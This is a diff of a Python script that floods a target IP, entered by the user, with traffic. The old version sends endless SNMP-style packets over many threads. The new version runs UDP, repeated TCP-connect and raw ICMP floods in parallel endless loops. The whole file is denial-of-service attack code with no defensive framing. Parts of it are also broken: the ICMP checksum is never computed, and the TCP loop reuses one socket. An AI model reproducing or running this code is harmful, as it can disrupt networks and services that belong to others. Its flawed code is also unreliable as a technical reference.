@@ -1,48 +1,50 @@
 import socket
-import time
 import threading
 import os
+import struct
 
-def send_snmp_request(target_ip, target_port, packet_size):
-    msg_ver = b"\x02\x01\x01"
-    msg_community = b"\x04\x06\x70\x75\x62\x6c\x69\x63"
-    msg_pdu = b"\xA2"
-    msg_value = b"\x02\x04" + b"\x00" * 4
+# ICMP packet header fields
+ICMP_ECHO_REQUEST = 8
+ICMP_CODE = socket.getprotobyname('icmp')
 
-    # create a socket object
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+def send_udp_packets(target_ip, target_port, packet_size):
+    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    udp_packet_data = b'A' * packet_size
 
-    try:
-        # set a timeout value for the socket
-        client_socket.settimeout(2)
+    while True:
+        udp_socket.sendto(udp_packet_data, (target_ip, target_port))
 
-        # connect to the target IP and port
-        client_socket.connect((target_ip, target_port))
+def send_tcp_syn_packets(target_ip, target_port):
+    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    tcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-        while True:
-            client_socket.send(msg_ver + msg_community + msg_pdu + msg_value + b"A" * packet_size)
+    while True:
+        tcp_socket.connect((target_ip, target_port))
 
-    except socket.error as e:
-        print("Error: Failed to send SNMP request -", e)
+def send_icmp_packets(target_ip):
+    icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, ICMP_CODE)
+    icmp_packet_data = b'A' * 64  # ICMP packet payload
 
-    finally:
-        client_socket.close()
+    # ICMP echo request packet structure
+    icmp_packet = struct.pack("BBHHH", ICMP_ECHO_REQUEST, 0, 0, os.getpid() & 0xFFFF, 1) + icmp_packet_data
 
-# prompt the user for target IP address, port, and packet size
+    while True:
+        icmp_socket.sendto(icmp_packet, (target_ip, 1))  # Send ICMP echo request
+
+# Prompt the user for target IP address, port, and packet size
 target_ip = input("Enter the target IP address: ")
-target_port = int(input("Enter the SNMP port: "))
+target_port = int(input("Enter the target port: "))
 packet_size = int(input("Enter the packet size (in bytes): "))
 
-# calculate the number of threads based on the number of CPU cores available
-num_threads = os.cpu_count()
+# Create and start the UDP packet sending thread
+udp_thread = threading.Thread(target=send_udp_packets, args=(target_ip, target_port, packet_size))
+udp_thread.start()
 
-# create and start the threads
-threads = []
-for _ in range(num_threads):
-    thread = threading.Thread(target=send_snmp_request, args=(target_ip, target_port, packet_size))
-    thread.start()
-    threads.append(thread)
+# Create and start the TCP SYN packet sending thread
+tcp_thread = threading.Thread(target=send_tcp_syn_packets, args=(target_ip, target_port))
+tcp_thread.start()
 
-# wait for all threads to finish
-for thread in threads:
-    thread.join()
+# Create and start the ICMP packet sending thread
+icmp_thread = threading.Thread(target=send_icmp_packets, args=(target_ip,))
+icmp_thread.start()
